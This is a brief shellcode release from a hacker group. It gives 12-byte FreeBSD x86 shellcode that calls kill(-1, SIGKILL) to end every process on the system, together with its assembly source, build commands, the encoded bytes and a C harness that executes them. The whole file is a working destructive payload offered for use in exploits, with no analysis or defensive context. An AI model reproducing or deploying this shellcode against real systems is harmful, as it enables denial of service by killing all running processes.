//             ***(C)oDed bY suN8Hclf***
//        DaRk-CodeRs Group productions, kid
//  [FreeBSD x86 kill all procesess 12 bytes shellcode]


// Compile:
// nasm -f elf code.asm
// ld -e _start -o code code.o

// Assembly code:
// ---------------------code.asm-------------------
// section .text
// global _start

// _start:
// xor eax, eax
// push byte 9 ; SIGKILL
// dec eax
// push eax    ; -1 (0xffffffff)
// inc eax
// mov al, 37  ;kill() syscall number, check /usr/src/sys/kern/syscalls.master for details
// push eax
// int 0x80
// ---------------------code.asm-------------------

// And C code:
// ---------------------code.c---------------------
#include "stdio.h"

char shellcode[]=
"\x31\xc0\x6a\x09\x48\x50\x40\xb0\x25\x50\xcd\x80";

int main()
{
int (*func)();
func=(int (*)())shellcode;
(int)(*func)();
}
// ---------------------code.c---------------------


// Greetz: all DaRk-CodeRs guys, e.wiZz!, doctor
// Visit : www.dark-coders.pl





